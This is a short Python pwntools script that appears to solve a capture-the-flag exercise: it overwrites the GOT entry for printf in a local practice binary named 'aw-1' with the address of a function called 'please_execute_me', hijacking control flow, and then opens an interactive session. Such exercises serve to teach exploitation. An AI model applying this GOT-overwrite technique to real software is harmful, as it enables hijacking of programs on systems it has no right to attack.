#!/usr/bin/env python

from pwn import *
import os

p = process('./aw-1')

printf_got = p.elf.got['printf']
print ("GOT: %s" % hex(printf_got))

please_exe_me = p.elf.symbols['please_execute_me']
print ("please_exe_me: %s" % hex(please_exe_me))

p.sendline("6")
p.sendline(hex(printf_got))
p.sendline(p64(please_exe_me))

p.interactive()

